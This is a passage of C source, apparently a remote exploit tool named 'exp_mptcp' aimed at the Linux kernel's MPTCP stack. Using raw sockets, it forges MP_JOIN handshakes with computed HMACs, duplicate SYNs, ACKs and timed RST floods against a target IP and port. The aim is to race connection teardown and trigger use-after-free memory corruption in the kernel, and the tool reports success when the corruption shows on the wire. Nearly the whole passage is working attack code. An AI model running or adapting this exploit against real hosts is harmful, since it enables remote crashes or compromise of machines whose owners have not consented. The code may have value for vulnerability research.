                 * ip_options_build reads ireq_opt) then a PLAIN final ACK
                 * (fallback_is_fatal -> child created -> dispose_child ->
                 * tcp_done -> inet_sock_destruct -> kfree(ireq_opt/inet_opt)).
                 * The ACK frees the options while the dup-SYN reader is still
                 * copying them. */
                uint8_t jo2[32];
                int jl = mpj_syn(jo2, g_token, S->nonce);
                int dn = build_tcp(ackp, S->sport, S->client_isn, 0, 0x02,
                                   jo2, jl, S->marker);
                if (getenv("FRAG_DUP"))
                    xsend_frag(ackp, dn);
                else
                    xsend(ackp, dn);
                if (dispose_gap) usleep(dispose_gap);
                int an = build_tcp(ackp, S->sport, S->client_isn + 1,
                                   S->snt_isn + 1, 0x10, NULL, 0, 0);
                xsend(ackp, an);
                atomic_fetch_add(&g_jack, 1);
                S->rcv_nxt = 0; S->snt_isn = 0; S->data_seen = 0;
                did++;
                continue;
            }
            /* Complete the subflow: MP_JOIN ACK with the third-ACK HMAC.
             * Kernel check (subflow_thmac_valid on the server):
             *   HMAC-SHA256(key1=remote_key(=client), key2=local_key(=server),
             *               msg=remote_nonce(=client) || local_nonce(=server))
             * The key is be64(client_key)||be64(server_key), which for our
             * wire-order byte arrays is g_cli_key||g_srv_key. */
            uint8_t *to = NULL, ao[32];
            int tl = 0;
            if (S->is_mpj && S->srv_nonce) {
                uint8_t key[16], msg[8], h[32];
                memcpy(key, g_cli_key, 8);
                memcpy(key + 8, g_srv_key, 8);
                put32(msg, S->nonce);
                put32(msg + 4, S->srv_nonce);
                hmac_sha256_16(key, msg, 8, h);
                tl = mpj_ack(ao, h);
                to = ao;
                {
                    static atomic_int hdbg;
                    if (atomic_fetch_add(&hdbg, 1) < 2) {
                        printf("[hmac] sport=%u cli=", S->sport);
                        for (int i = 0; i < 8; i++) printf("%02x", g_cli_key[i]);
                        printf(" srv=");
                        for (int i = 0; i < 8; i++) printf("%02x", g_srv_key[i]);
                        printf(" cnonce=%08x snonce=%08x msg=", S->nonce, S->srv_nonce);
                        for (int i = 0; i < 8; i++) printf("%02x", msg[i]);
                        printf(" hmac=");
                        for (int i = 0; i < 20; i++) printf("%02x", h[i]);
                        printf("\n");
                    }
                }
            } else {
                /* fallback target: plain final ACK */
            }
            int n = build_tcp(ackp, S->sport, S->client_isn + 1,
                              S->snt_isn + 1, 0x10, to, tl, 0);
            xsend(ackp, n);
            atomic_fetch_add(&g_jack, 1);
            S->t0 = (struct timespec){0};
            clock_gettime(CLOCK_MONOTONIC, &S->t0);
            did++;
        }
        if (!did) usleep(100);
    }
    return NULL;
}

/* acker: keep the msk's data stream flowing (subflow-level ACKs). Without
 * ACKs the sender stalls after one cwnd and the scheduler never moves data
 * onto the JOIN subflows (the reader lives on those TXs). */
static void *acker(void *arg) {
    (void)arg;
    uint8_t ackp[64];
    while (g_run) {
        if (g_have_keys && g_base_fd < 0) {
            /* raw base (legacy mode): the tool must ACK the base stream */
            uint32_t rn = g_base_rcv_nxt;
            if (rn && rn != g_base_ack_sent) {
                g_base_ack_sent = rn;
                int n = build_tcp(ackp, g_base_sport, g_base_isn + 1, rn, 0x10, NULL, 0, 0);
                xsend(ackp, n);
            }
        }
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct slot *S = &g_slots[s];
            if (S->state != ST_KILL || !S->data_seen) continue;
            int n = build_tcp(ackp, S->sport, S->client_isn + 1, S->rcv_nxt, 0x10, NULL, 0, 0);
            xsend(ackp, n);
        }
        usleep(500);
    }
    return NULL;
}

/* kill: RST the subflow while it streams -> the target tears down the JOIN
 * child (no app fd holds it) in the RST softirq / mptcp worker CPU, racing
 * the listener's in-flight ip_queue_xmit on that subflow (different CPU).
 * Small random delay after the stream starts so the RST lands mid-stream. */
static void *killer(void *arg) {
    (void)arg;
    if (getenv("NOKILL")) return NULL;   /* handshake-only test */
    long kill_delay = getenv("KILL_DELAY_MS") ? atol(getenv("KILL_DELAY_MS")) : 0;
    uint8_t rst[64];
    while (g_run) {
        struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
        for (int s = 0; s < NSLOTS && g_run; s++) {
            struct slot *S = &g_slots[s];
            if (S->state != ST_KILL) continue;
            long age_ms = (now.tv_sec-S->t0.tv_sec)*1000L + (now.tv_nsec-S->t0.tv_nsec)/1000000;
            int seen = atomic_load(&S->data_seen);
            if (!seen && age_ms < 400) continue;
            /* Let the join stream for KILL_DELAY_MS so the sender is in-flight
             * when the teardown free lands (the reader window). */
            if (kill_delay && age_ms < kill_delay) continue;
            atomic_store(&S->data_seen, 0);
            int n = build_tcp(rst, S->sport, S->rcv_nxt, 0, 0x04, NULL, 0, 0);
            xsend(rst, n);
            xsend(rst, n); xsend(rst, n);
            atomic_fetch_add(&g_rst, 1);
            usleep(2000);
            S->rcv_nxt = 0; S->snt_isn = 0; S->data_seen = 0;
            S->state = ST_FREE;
        }
        usleep(200);
    }
    return NULL;
}

static void *churn(void *arg) {
    (void)arg;
    if (getenv("NOCHURN")) return NULL;   /* handshake-only test */
    uint8_t syn[128], rst[64], jo[32];
    for (uint32_t i = 0; g_run; i++) {
        uint16_t sport = CBASE + (i % CNUM);
        uint32_t isn = 0x12340000u + i;
        int ns = build_tcp(syn, sport, isn, 0, 0x02, NULL, 0, CMARK(i));
        xsend(syn, ns);
        int nr = build_tcp(rst, sport, isn + 1, 0, 0x04, NULL, 0, 0);
        xsend(rst, nr);
        atomic_fetch_add(&g_churn, 1);
        if (i % 64 == 63) usleep(4000);
    }
    return NULL;
}

int main(int argc, char **argv) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc < 3) {
        fprintf(stderr, "usage: %s <target_ip> <mptcp_port> [runtime_s]\n", argv[0]);
        return 1;
    }
    snprintf(g_target, sizeof(g_target), "%s", argv[1]);
    g_dport = atoi(argv[2]);
    if (argc > 3) g_runtime = atoi(argv[3]);
    memset(&g_dst, 0, sizeof(g_dst));
    g_dst.sin_family = AF_INET;
    g_dst.sin_port = htons(g_dport);
    if (inet_pton(AF_INET, g_target, &g_dst.sin_addr) != 1) die("bad target ip");

    g_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (g_fd < 0) {
        fprintf(stderr, "[-] raw socket failed (errno=%d); grant: sudo setcap cap_net_raw+ep %s\n",
                errno, argv[0]);
        return 1;
    }
    int u = socket(AF_INET, SOCK_DGRAM, 0);
    if (u >= 0) {
        if (connect(u, (struct sockaddr *)&g_dst, sizeof(g_dst)) == 0) {
            struct sockaddr_in lo; socklen_t sl = sizeof(lo);
            if (getsockname(u, (struct sockaddr *)&lo, &sl) == 0)
                inet_ntop(AF_INET, &lo.sin_addr, g_self, sizeof(g_self));
        }
        close(u);
    }
    if (!g_self[0]) die("cannot determine source ip");
    /* per-run uniqueness so stale connections from prior runs can't collide */
    g_seed = (uint32_t)(getpid() ^ (time(NULL) & 0xffff)) * 2654435761u;
    g_base_sport = 55000 + (g_seed % 500);
    g_base_isn += g_seed;
    printf("[*] exp_mptcp: target=%s:%d src=%s slots=%d base_sport=%u runtime=%ds\n",
           g_target, g_dport, g_self, NSLOTS, g_base_sport, g_runtime);
    fprintf(stderr, "[i] MP_JOIN mode: %s (fallback ACK if the target has no MP_JOIN)\n",
            g_have_keys ? "keys available" : "waiting for base MP_CAPABLE");

    pthread_t th[6];
    pthread_create(&th[0], NULL, capture, NULL);
    pthread_create(&th[1], NULL, joiner, NULL);
    pthread_create(&th[2], NULL, establisher, NULL);
    pthread_create(&th[3], NULL, killer, NULL);
    pthread_create(&th[4], NULL, churn, NULL);
    pthread_create(&th[5], NULL, acker, NULL);
    pthread_t thc; pthread_create(&thc, NULL, cycler, NULL);

    time_t t0 = time(NULL);
    uint64_t last_data = 0;
    while (time(NULL) - t0 < g_runtime) {
        sleep(10);
        printf("[t+%3lds] jsyn=%lu jack=%lu rst=%lu data=%lu base=%lu marked=%lu xflow=%lu churnhit=%lu foreign=%lu churn=%lu\n",
               (long)(time(NULL)-t0), g_jsyn, g_jack, g_rst, g_datapkts, g_basedata, g_marked,
               g_xflow, g_churnhit, g_foreign, g_churn);
        if (g_datapkts == last_data && g_jack > 10)
            printf("[!] no data on JOIN subflows (base=%lu) - check MP_JOIN HMAC/token\n",
                   g_basedata);
        last_data = g_datapkts;
        if (g_xflow || g_churnhit) printf("[+] USE-AFTER-FREE observed on the wire\n");
    }
    g_run = 0;
    for (int i = 0; i < 6; i++) pthread_join(th[i], NULL);
    pthread_join(thc, NULL);
    printf("[*] done: jsyn=%lu jack=%lu rst=%lu data=%lu base=%lu marked=%lu xflow=%lu churnhit=%lu foreign=%lu\n",
           g_jsyn, g_jack, g_rst, g_datapkts, g_basedata, g_marked, g_xflow, g_churnhit, g_foreign);
    return (g_xflow || g_churnhit) ? 0 : 2;
}
